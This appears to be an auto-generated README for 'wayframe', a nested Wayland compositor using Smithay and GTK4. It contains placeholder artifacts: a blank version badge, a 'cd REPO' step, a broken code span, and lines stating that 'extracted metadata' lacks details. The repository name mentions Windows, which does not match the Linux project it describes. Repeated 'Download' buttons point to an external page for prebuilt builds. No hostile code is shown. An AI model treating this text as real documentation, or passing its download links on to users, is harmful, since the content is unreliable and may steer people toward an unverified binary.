# wayframe - Wayland Compositor 2026

> **wayframe is a Linux Wayland compositor that runs nested apps inside a GTK4 window, helping improve GNOME compatibility through enforced server-side decorations in its current release.**

[![Platform](https://img.shields.io/badge/Platform-Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/calebio1999/wayframe-linux-windows?style=flat-square)](https://github.com/calebio1999/wayframe-linux-windows)

---

<p align="center">
  <a href="https://calebio1999.github.io/wayframe-linux-windows/">
    <img src="https://img.shields.io/badge/Download-wayframe%20Latest-brightgreen?style=for-the-badge" alt="Download wayframe">
  </a>
</p>

> **[Direct Download - wayframe v](https://calebio1999.github.io/wayframe-linux-windows/)**

---

[Download Latest Build](https://calebio1999.github.io/wayframe-linux-windows/)

---

## What is wayframe?

wayframe is a nested Wayland compositor for Linux that focuses on running applications inside a GTK4 container window. In its current form, it applies server-side decorations, which can improve how it fits into GNOME-centered workflows and related desktop setups.

Its stack includes Wayland-oriented pieces such as Smithay, xdg-decoration, gtk4, and libadwaita. That makes it a good fit for people who want to inspect compositor behavior, exercise nested sessions, or use a compositor aimed at desktop integration instead of a stripped-down shell.

---

## Capabilities

- Nested Wayland compositor for launching sessions within another window
- GTK4-backed app containment for a desktop-oriented presentation
- Server-side decorations applied for consistent window decoration behavior
- Stronger GNOME compatibility via Wayland and xdg-decoration support
- Compositor stack built around Smithay
- Designed to work with libadwaita-style desktop integration
- Linux-oriented runtime for Wayland environments
- Useful for nested compositor testing and compatibility exploration

---

## Installation

Clone the repository and build it with your preferred Rust toolchain and Wayland development environment:

1. Fetch the source:
   - `git clone https://github.com/calebio1999/wayframe-linux-windows.git
   - `cd REPO`
2. Build the project according to the repository's build setup.
3. Launch the resulting compositor binary from your session or terminal.

If you are using a packaged or prebuilt release from the download link above, follow the provided launch instructions for that build.

---

## Usage

wayframe is meant to be started as a compositor process, then used to open or host apps inside its GTK4 windowed environment.

Typical workflow:

- Start the compositor from a terminal or desktop launcher.
- Open a Wayland client session within the nested environment.
- Observe how server-side decorations and GNOME-compatible behavior are applied.
- Use it to compare app rendering, decoration handling, or nested-session behavior.

Example launch pattern:

- `./wayframe`

If the build produces a different binary name or startup wrapper, use the command provided by the project or release artifacts.

---

## Configuration

The extracted metadata does not list runtime configuration details. If the project offers options at launch, they are probably exposed through the source tree, command-line flags, or compositor-specific config files.

Common places to check include:

- project documentation
- environment variables used at startup
- compositor runtime configuration files
- release notes for build-specific options

Example format if options are supported:

    [compositor]
    decoration_mode = "server-side"
    window_backend = "gtk4"

Adjust only according to the settings actually provided by the build or source.

---

## Requirements

- Linux
- Wayland-capable environment
- GTK4
- libadwaita
- Smithay-based compositor support
- xdg-decoration support
- A build/runtime setup compatible with the project's source and launch method

If building from source, a Rust toolchain and the related native development packages are typically needed.

---

## FAQ

**How do I get updates?**  
Use the repository and the download link above to check for the latest build or release artifacts.

**Where are configuration options stored?**  
Check the project source, startup flags, or any runtime config files included with the repository.

**What should I do if it does not start?**  
Confirm your Wayland session, required desktop libraries, and build dependencies, then review the terminal output for errors.

**Is this meant for a full desktop session?**  
The metadata points to a nested compositor workflow, so it is better treated as an environment for hosting apps or validating compatibility behavior.

**Who should use it?**  
It is aimed at users and developers working with Wayland, GNOME compatibility, nested compositors, or GTK-based integration paths.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
